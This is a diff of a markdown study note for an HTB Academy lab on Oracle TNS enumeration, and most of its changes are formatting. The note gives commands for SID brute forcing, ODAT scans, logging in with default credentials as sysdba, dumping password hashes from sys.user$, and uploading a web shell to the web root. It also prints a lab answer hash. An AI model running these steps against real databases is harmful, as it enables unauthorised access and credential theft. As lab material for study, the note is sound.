@@ -1,58 +1,66 @@
-# Oracle TNS Enumeration
+# ⚡ Oracle TNS Enumeration
 
 ## Overview
+
 The Oracle Transparent Network Substrate (TNS) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the Oracle Net Services software suite, TNS supports various networking protocols between Oracle databases and client applications, such as IPX/SPX and TCP/IP protocol stacks.
 
 **Key Characteristics:**
-- **Port 1521**: Default Oracle TNS port
-- **Authentication**: Username/password
-- **SID**: System Identifier for database instances
-- **Protocol**: Oracle Native Network Protocol
-- **Industries**: Healthcare, finance, retail (large, complex databases)
+
+* **Port 1521**: Default Oracle TNS port
+* **Authentication**: Username/password
+* **SID**: System Identifier for database instances
+* **Protocol**: Oracle Native Network Protocol
+* **Industries**: Healthcare, finance, retail (large, complex databases)
 
 ## TNS Features and Capabilities
 
 TNS has been updated to support newer technologies and provides:
 
-| Feature | Description |
-|---------|-------------|
-| **Name resolution** | Resolves service names to network addresses |
-| **Connection management** | Manages database connections and sessions |
-| **Load balancing** | Distributes connections across multiple instances |
-| **Security** | Built-in encryption mechanism for data transmission |
-| **IPv6 Support** | Modern network protocol support |
-| **SSL/TLS Encryption** | Additional security layer over TCP/IP |
+| Feature                   | Description                                         |
+| ------------------------- | --------------------------------------------------- |
+| **Name resolution**       | Resolves service names to network addresses         |
+| **Connection management** | Manages database connections and sessions           |
+| **Load balancing**        | Distributes connections across multiple instances   |
+| **Security**              | Built-in encryption mechanism for data transmission |
+| **IPv6 Support**          | Modern network protocol support                     |
+| **SSL/TLS Encryption**    | Additional security layer over TCP/IP               |
 
 ## Advanced TNS Capabilities
 
 ### Security Features
-- **Encryption**: Client-server communication encryption
-- **Authentication**: Host-based and user-based authentication
-- **Network Security**: Protection against unauthorized access
+
+* **Encryption**: Client-server communication encryption
+* **Authentication**: Host-based and user-based authentication
+* **Network Security**: Protection against unauthorized access
 
 ### Administrative Tools
-- **Performance Monitoring**: Comprehensive performance analysis tools
-- **Error Reporting**: Detailed logging capabilities
-- **Workload Management**: Database service management
-- **Fault Tolerance**: High availability through database services
+
+* **Performance Monitoring**: Comprehensive performance analysis tools
+* **Error Reporting**: Detailed logging capabilities
+* **Workload Management**: Database service management
+* **Fault Tolerance**: High availability through database services
 
 ## Default Configuration
 
 ### Basic TNS Configuration
+
 By default, the Oracle TNS listener:
-- **Port**: Listens on TCP/1521 (configurable)
-- **Protocols**: Supports TCP/IP, UDP, IPX/SPX, and AppleTalk
-- **Interfaces**: Can listen on multiple network interfaces
-- **Management**: Remotely manageable in Oracle 8i/9i (not in 10g/11g)
+
+* **Port**: Listens on TCP/1521 (configurable)
+* **Protocols**: Supports TCP/IP, UDP, IPX/SPX, and AppleTalk
+* **Interfaces**: Can listen on multiple network interfaces
+* **Management**: Remotely manageable in Oracle 8i/9i (not in 10g/11g)
 
 ### Security Features
-- **Host Authorization**: Accepts connections only from authorized hosts
-- **Basic Authentication**: Uses hostnames, IP addresses, usernames, and passwords
-- **Encryption**: Oracle Net Services encrypts client-server communication
+
+* **Host Authorization**: Accepts connections only from authorized hosts
+* **Basic Authentication**: Uses hostnames, IP addresses, usernames, and passwords
+* **Encryption**: Oracle Net Services encrypts client-server communication
 
 ## Configuration Files
 
 ### tnsnames.ora (Client-side)
+
 The client-side configuration file used by Oracle Net Services to resolve service names:
 
 ```bash
@@ -71,12 +79,14 @@ ORCL =
 ```
 
 **Key Components:**
-- **Service Name**: ORCL (client identifier)
-- **Host**: 10.129.11.102 (database server)
-- **Port**: 1521 (listener port)
-- **Service**: orcl (database service name)
+
+* **Service Name**: ORCL (client identifier)
+* **Host**: 10.129.11.102 (database server)
+* **Port**: 1521 (listener port)
+* **Service**: orcl (database service name)
 
 ### listener.ora (Server-side)
+
 The server-side configuration file defining listener process properties:
 
 ```bash
@@ -112,63 +122,69 @@ ADR_BASE_LISTENER = C:\oracle
 
 ### Essential Settings
 
-| Setting | Description |
-|---------|-------------|
-| **DESCRIPTION** | Descriptor providing database name and connection type |
-| **ADDRESS** | Network address including hostname and port number |
-| **PROTOCOL** | Network protocol used for communication |
-| **PORT** | Port number for server communication |
-| **CONNECT_DATA** | Connection attributes (service name, SID, protocol) |
-| **INSTANCE_NAME** | Database instance name for client connection |
-| **SERVICE_NAME** | Service name for client connection |
-| **SERVER** | Server type (dedicated or shared) |
-| **USER** | Username for database authentication |
-| **PASSWORD** | Password for database authentication |
+| Setting            | Description                                            |
+| ------------------ | ------------------------------------------------------ |
+| **DESCRIPTION**    | Descriptor providing database name and connection type |
+| **ADDRESS**        | Network address including hostname and port number     |
+| **PROTOCOL**       | Network protocol used for communication                |
+| **PORT**           | Port number for server communication                   |
+| **CONNECT\_DATA**  | Connection attributes (service name, SID, protocol)    |
+| **INSTANCE\_NAME** | Database instance name for client connection           |
+| **SERVICE\_NAME**  | Service name for client connection                     |
+| **SERVER**         | Server type (dedicated or shared)                      |
+| **USER**           | Username for database authentication                   |
+| **PASSWORD**       | Password for database authentication                   |
 
 ### Advanced Settings
 
-| Setting | Description |
-|---------|-------------|
-| **SECURITY** | Connection security type |
-| **VALIDATE_CERT** | SSL/TLS certificate validation |
-| **SSL_VERSION** | SSL/TLS version for connection |
-| **CONNECT_TIMEOUT** | Connection establishment time limit |
-| **RECEIVE_TIMEOUT** | Response receiving time limit |
-| **SEND_TIMEOUT** | Request sending time limit |
-| **SQLNET.EXPIRE_TIME** | Connection failure detection time limit |
-| **TRACE_LEVEL** | Database connection tracing level |
-| **TRACE_DIRECTORY** | Trace file storage directory |
-| **TRACE_FILE_NAME** | Trace file name |
-| **LOG_FILE** | Log information storage file |
+| Setting                 | Description                             |
+| ----------------------- | --------------------------------------- |
+| **SECURITY**            | Connection security type                |
+| **VALIDATE\_CERT**      | SSL/TLS certificate validation          |
+| **SSL\_VERSION**        | SSL/TLS version for connection          |
+| **CONNECT\_TIMEOUT**    | Connection establishment time limit     |
+| **RECEIVE\_TIMEOUT**    | Response receiving time limit           |
+| **SEND\_TIMEOUT**       | Request sending time limit              |
+| **SQLNET.EXPIRE\_TIME** | Connection failure detection time limit |
+| **TRACE\_LEVEL**        | Database connection tracing level       |
+| **TRACE\_DIRECTORY**    | Trace file storage directory            |
+| **TRACE\_FILE\_NAME**   | Trace file name                         |
+| **LOG\_FILE**           | Log information storage file            |
 
 ## Oracle Version Differences
 
 ### Password Defaults
-- **Oracle 9**: Default password `CHANGE_ON_INSTALL`
-- **Oracle 10**: No default password set
-- **Oracle DBSNMP**: Default password `dbsnmp`
+
+* **Oracle 9**: Default password `CHANGE_ON_INSTALL`
+* **Oracle 10**: No default password set
+* **Oracle DBSNMP**: Default password `dbsnmp`
 
 ### Service Integration
+
 Oracle TNS is often used with:
-- Oracle DBSNMP
-- Oracle Application Server
-- Oracle Enterprise Manager
-- Oracle Fusion Middleware
-- Web servers
-- Legacy services (like finger service)
+
+* Oracle DBSNMP
+* Oracle Application Server
+* Oracle Enterprise Manager
+* Oracle Fusion Middleware
+* Web servers
+* Legacy services (like finger service)
 
 ## Security Features
 
 ### PL/SQL Exclusion List
+
 Oracle databases can be protected using PL/SQL Exclusion List (PlsqlExclusionList):
-- **Location**: `$ORACLE_HOME/sqldeveloper` directory
-- **Purpose**: Text file containing PL/SQL packages to exclude from execution
-- **Function**: Serves as a blacklist for Oracle Application Server
-- **Implementation**: Loaded into database instance for package restrictions
+
+* **Location**: `$ORACLE_HOME/sqldeveloper` directory
+* **Purpose**: Text file containing PL/SQL packages to exclude from execution
+* **Function**: Serves as a blacklist for Oracle Application Server
+* **Implementation**: Loaded into database instance for package restrictions
 
 ## Setting up Oracle TNS Tools
 
 ### Complete Setup Script
+
 ```bash
 # Download Oracle Instant Client
 wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
@@ -199,6 +215,7 @@ pip3 install pycryptodome
 ```
 
 ### Testing ODAT Installation
+
 ```bash
 # Test ODAT installation
 ./odat.py -h
@@ -225,6 +242,7 @@ By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
 ## Enumeration Techniques
 
 ### 1. Service Detection
+
 ```bash
 # Nmap Oracle TNS detection
 sudo nmap -p1521 -sV target --open
@@ -237,13 +255,15 @@ PORT     STATE SERVICE    VERSION
 ### 2. SID Enumeration
 
 #### System Identifier (SID) Concepts
-- **Purpose**: Unique name identifying a particular database instance
-- **Multiple Instances**: Each instance has its own System ID
-- **Connection**: Client specifies SID in connection string
-- **Default**: Uses tnsnames.ora value if not specified
-- **Management**: Used by DBAs to monitor and manage instances
+
+* **Purpose**: Unique name identifying a particular database instance
+* **Multiple Instances**: Each instance has its own System ID
+* **Connection**: Client specifies SID in connection string
+* **Default**: Uses tnsnames.ora value if not specified
+* **Management**: Used by DBAs to monitor and manage instances
 
 #### SID Brute Forcing with Nmap
+
 ```bash
 # Nmap SID brute forcing
 sudo nmap -p1521 -sV target --open --script oracle-sid-brute
@@ -256,6 +276,7 @@ PORT     STATE SERVICE    VERSION
 ```
 
 ### 3. ODAT Comprehensive Enumeration
+
 ```bash
 # Run all ODAT modules
 ./odat.py all -s target
@@ -275,6 +296,7 @@ PORT     STATE SERVICE    VERSION
 ## Database Interaction
 
 ### SQLplus Connection
+
 ```bash
 # Connect with discovered credentials
 sqlplus scott/tiger@target/XE
@@ -295,6 +317,7 @@ SQL>
 ```
 
 ### Library Error Fix
+
 ```bash
 # If you encounter library errors
 sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
@@ -304,6 +327,7 @@ sudo ldconfig
 ## Database Enumeration
 
 ### Basic Database Information
+
 ```bash
 # List all tables
 SQL> select table_name from all_tables;
@@ -333,6 +357,7 @@ SCOTT                          RESOURCE                       NO  YES NO
 ```
 
 ### Privilege Escalation
+
 ```bash
 # Connect as sysdba for higher privileges
 sqlplus scott/tiger@target/XE as sysdba
@@ -359,6 +384,7 @@ SYS                            DBFS_ROLE                      YES YES NO
 ## Password Hash Extraction
 
 ### Extract User Password Hashes
+
 ```bash
 # Extract password hashes from sys.user$
 SQL> select name, password from sys.user$;
@@ -385,12 +411,13 @@ LOGSTDBY_ADMINISTRATOR
 
 ### Web Server Default Paths
 
-| OS | Path |
-|----|------|
-| **Linux** | `/var/www/html` |
+| OS          | Path                 |
+| ----------- | -------------------- |
+| **Linux**   | `/var/www/html`      |
 | **Windows** | `C:\inetpub\wwwroot` |
 
 ### File Upload with ODAT
+
 ```bash
 # Create test file
 echo "Oracle File Upload Test" > testing.txt
@@ -404,6 +431,7 @@ echo "Oracle File Upload Test" > testing.txt
 ```
 
 ### Verify File Upload
+
 ```bash
 # Test file upload with curl
 curl -X GET http://target/testing.txt
@@ -415,9 +443,11 @@ Oracle File Upload Test
 ## HTB Academy Lab Questions
 
 ### Question: Password Hash Extraction
+
 **Task**: Enumerate the target Oracle database and submit the password hash of the user DBSNMP
 
 **Solution**:
+
 ```bash
 # Step 1: Service detection
 sudo nmap -p1521 -sV target --open
@@ -446,6 +476,7 @@ DBSNMP                         E066D214D5421CCC
 ## Advanced Enumeration Techniques
 
 ### ODAT Module Overview
+
 ```bash
 # Available ODAT modules:
 all                   # Run all modules
@@ -480,6 +511,7 @@ clean                # Clean traces and logs
 ## Security Assessment
 
 ### Common Vulnerabilities
+
 1. **Default Credentials**: Standard Oracle accounts with default passwords
 2. **SID Enumeration**: Brute force attacks on SID values
 3. **Privilege Escalation**: Weak privilege controls
@@ -487,19 +519,21 @@ clean                # Clean traces and logs
 5. **Password Hash Extraction**: Weak password hashing
 
 ### Enumeration Checklist
-- [ ] Port scan for 1521
-- [ ] Service version detection
-- [ ] SID enumeration
-- [ ] Credential testing
-- [ ] Database connection
-- [ ] Privilege escalation testing
-- [ ] Password hash extraction
-- [ ] File upload capabilities
-- [ ] Web shell deployment
+
+* [ ] Port scan for 1521
+* [ ] Service version detection
+* [ ] SID enumeration
+* [ ] Credential testing
+* [ ] Database connection
+* [ ] Privilege escalation testing
+* [ ] Password hash extraction
+* [ ] File upload capabilities
+* [ ] Web shell deployment
 
 ## Attack Vectors
 
 ### 1. Credential-based Access
+
 ```bash
 # Common Oracle credentials
 scott/tiger
@@ -509,12 +543,14 @@ dbsnmp/dbsnmp
 ```
 
 ### 2. File Upload Exploitation
+
 ```bash
 # Upload web shell
 ./odat.py utlfile -s target -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.php ./shell.php
 ```
 
 ### 3. Database Information Extraction
+
 ```bash
 # Extract sensitive information
 SQL> SELECT * FROM dba_users;
@@ -525,9 +561,10 @@ SQL> SELECT * FROM dba_tab_privs;
 ## Defensive Measures
 
 ### Security Best Practices
+
 1. **Change Default Passwords**: Replace all default Oracle passwords
 2. **Restrict Network Access**: Limit TNS listener network exposure
 3. **Enable Encryption**: Use SSL/TLS for all connections
 4. **Regular Updates**: Apply Oracle security patches
 5. **Monitor Access**: Enable audit logging
-6. **Least Privilege**: Restrict database user permissions 
+6. **Least Privilege**: Restrict database user permissions
